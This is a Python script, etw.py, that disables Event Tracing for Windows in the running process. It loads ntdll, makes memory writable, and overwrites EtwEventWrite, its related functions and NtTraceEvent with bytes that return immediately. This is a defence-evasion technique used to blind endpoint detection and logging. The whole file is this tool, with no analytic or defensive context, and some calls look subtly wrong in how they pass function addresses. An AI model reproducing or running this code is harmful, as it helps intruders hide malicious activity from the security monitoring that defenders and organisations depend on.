# etw.py

import ctypes
from ctypes import wintypes

# Load necessary DLLs
ntdll = ctypes.WinDLL('ntdll.dll')
kernel32 = ctypes.WinDLL('kernel32.dll')

# Define necessary functions
WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
WriteProcessMemory.restype = wintypes.BOOL

GetCurrentProcess = kernel32.GetCurrentProcess
GetCurrentProcess.restype = wintypes.HANDLE

NtProtectVirtualMemory = ntdll.NtProtectVirtualMemory
NtProtectVirtualMemory.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.LPVOID), ctypes.POINTER(ctypes.c_size_t), wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
NtProtectVirtualMemory.restype = wintypes.LONG

NtWriteVirtualMemory = ntdll.NtWriteVirtualMemory
NtWriteVirtualMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
NtWriteVirtualMemory.restype = wintypes.LONG

# Define the patch functions
def patch_etw():
    # Define the patch bytes
    patch_bytes = bytes.fromhex('4833C0C3')

    # Get the addresses of the functions to patch
    addresses = [
        ntdll.EtwEventWrite,
        ntdll.EtwEventWriteEx,
        ntdll.EtwEventWriteFull,
        ntdll.EtwEventWriteString,
        ntdll.EtwEventWriteTransfer
    ]

    # Patch each function
    for address in addresses:
        WriteProcessMemory(-1, address, patch_bytes, len(patch_bytes), None)

def patch_etw2():
    # Define the patch byte
    patch_byte = b'\xC3'

    # Get the current process handle
    process_handle = GetCurrentProcess()

    # Get the address of the function to patch
    addr = ntdll.NtTraceEvent

    # Define the region size
    region_size = ctypes.c_size_t(len(patch_byte))

    # Change memory protection to execute-read-write
    old_protect = wintypes.DWORD()
    NtProtectVirtualMemory(process_handle, ctypes.byref(ctypes.c_void_p(addr)), ctypes.byref(region_size), 0x40, ctypes.byref(old_protect))

    # Write the patch
    NtWriteVirtualMemory(process_handle, addr, patch_byte, len(patch_byte), None)

    # Restore the original memory protection
    NtProtectVirtualMemory(process_handle, ctypes.byref(ctypes.c_void_p(addr)), ctypes.byref(region_size), old_protect.value, ctypes.byref(old_protect))

# Example usage
if __name__ == '__main__':
    patch_etw()
    patch_etw2()
